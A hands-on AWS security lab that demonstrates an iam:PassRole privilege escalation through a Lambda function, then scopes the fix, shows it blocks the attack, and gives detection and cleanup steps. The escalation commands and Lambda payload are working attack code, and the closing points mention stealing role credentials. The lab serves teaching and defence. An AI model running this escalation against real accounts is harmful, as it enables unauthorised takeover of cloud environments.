# Lab 3: PassRole privilege escalation

**Goal:** turn a near-powerless "developer" (only Lambda + PassRole) into full admin,
without ever having admin permissions on the developer. Then scope the fix.

## Key concepts

- `iam:PassRole` on `*` means you can hand **any** passable role to a service, so your
  effective privileges become the most powerful role you can pass.
- Fix: scope `PassRole` by **resource** (a specific role path) **and** by
  `iam:PassedToService`.
- Detection: a `CreateFunction`/`UpdateFunctionConfiguration` event whose
  `requestParameters.role` is a privileged role. (`PassRole` itself is not logged as
  its own event; it is a permission check.)

## Steps

### 1. Variables

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
echo ${ACCOUNT_ID}
```

### 2. Create the "developer" role + a profile to act as it

```bash
cat > trust-root.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "AWS": "arn:aws:iam::${ACCOUNT_ID}:root" },
    "Action": "sts:AssumeRole"
  }]
}
EOF

aws iam create-role --role-name DevRole --assume-role-policy-document file://trust-root.json
aws configure set role_arn arn:aws:iam::${ACCOUNT_ID}:role/DevRole --profile dev
aws configure set source_profile default --profile dev
```

### 3. Give the developer its limited permissions

```bash
cat > dev-policy.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": [
      "iam:PassRole",
      "lambda:CreateFunction",
      "lambda:InvokeFunction",
      "lambda:GetFunction"
    ],
    "Resource": "*"
  }]
}
EOF

aws iam put-role-policy --role-name DevRole --policy-name DevInline --policy-document file://dev-policy.json
```

### 4. Create the over-privileged role that Lambda can assume

```bash
cat > lambda-trust.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "Service": "lambda.amazonaws.com" },
    "Action": "sts:AssumeRole"
  }]
}
EOF

aws iam create-role --role-name LambdaAdminRole --assume-role-policy-document file://lambda-trust.json
aws iam attach-role-policy --role-name LambdaAdminRole \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### 5. Confirm the developer is limited — expect AccessDenied

```bash
aws iam list-users --profile dev
```

### 6. Write the malicious Lambda payload

```bash
mkdir -p lambda-src && cd lambda-src
cat > index.py <<EOF
import boto3
def handler(event, context):
    iam = boto3.client('iam')
    iam.attach_role_policy(
        RoleName='DevRole',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return "DevRole is now admin"
EOF
zip function.zip index.py
cd ..
```

### 7. The escalation, performed as the developer

```bash
aws lambda create-function --profile dev \
  --function-name escalate \
  --runtime python3.12 \
  --handler index.handler \
  --role arn:aws:iam::${ACCOUNT_ID}:role/LambdaAdminRole \
  --zip-file fileb://lambda-src/function.zip \
  --timeout 30

sleep 10
aws lambda invoke --profile dev --function-name escalate /tmp/out.json
cat /tmp/out.json
```

### 8. Confirm the escalation worked

```bash
aws iam list-attached-role-policies --role-name DevRole
# AdministratorAccess should now be attached
aws iam list-users --profile dev
# The call denied in step 5 now succeeds
```

### 9. Apply the fix — scoped PassRole

```bash
aws iam detach-role-policy --role-name DevRole \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

cat > dev-policy-fixed.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["lambda:CreateFunction", "lambda:InvokeFunction", "lambda:GetFunction"],
      "Resource": "*"
    },
    {
      "Effect": "Allow",
      "Action": "iam:PassRole",
      "Resource": "arn:aws:iam::${ACCOUNT_ID}:role/lambda-apps/*",
      "Condition": { "StringEquals": { "iam:PassedToService": "lambda.amazonaws.com" } }
    }
  ]
}
EOF

aws iam put-role-policy --role-name DevRole --policy-name DevInline --policy-document file://dev-policy-fixed.json
```

### 10. Prove the escalation is now blocked — expect AccessDenied on PassRole

```bash
aws lambda create-function --profile dev \
  --function-name escalate2 \
  --runtime python3.12 \
  --handler index.handler \
  --role arn:aws:iam::${ACCOUNT_ID}:role/LambdaAdminRole \
  --zip-file fileb://lambda-src/function.zip \
  --timeout 30
```

`LambdaAdminRole` is at the account root, not under `lambda-apps/`, so PassRole is denied.

### 11. Clean up

```bash
aws lambda delete-function --function-name escalate 2>/dev/null
aws lambda delete-function --function-name escalate2 2>/dev/null
aws iam delete-role-policy --role-name DevRole --policy-name DevInline
aws iam delete-role --role-name DevRole
aws iam detach-role-policy --role-name LambdaAdminRole \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess 2>/dev/null
aws iam delete-role --role-name LambdaAdminRole
rm -rf lambda-src trust-root.json dev-policy.json dev-policy-fixed.json lambda-trust.json /tmp/out.json
```

Then remove the `[profile dev]` section from `~/.aws/config`.

## Interview talking points

- PassRole is only as safe as the roles it can pass; always scope by resource and by
  `iam:PassedToService`.
- The same escalation works via EC2 (`RunInstances` + instance profile), ECS task
  roles, Glue, SageMaker, CloudFormation — anything that accepts a role.
- A stealthier attacker exfiltrates the role's temporary credentials from the Lambda
  environment instead of attaching a policy — quieter, same entry point.
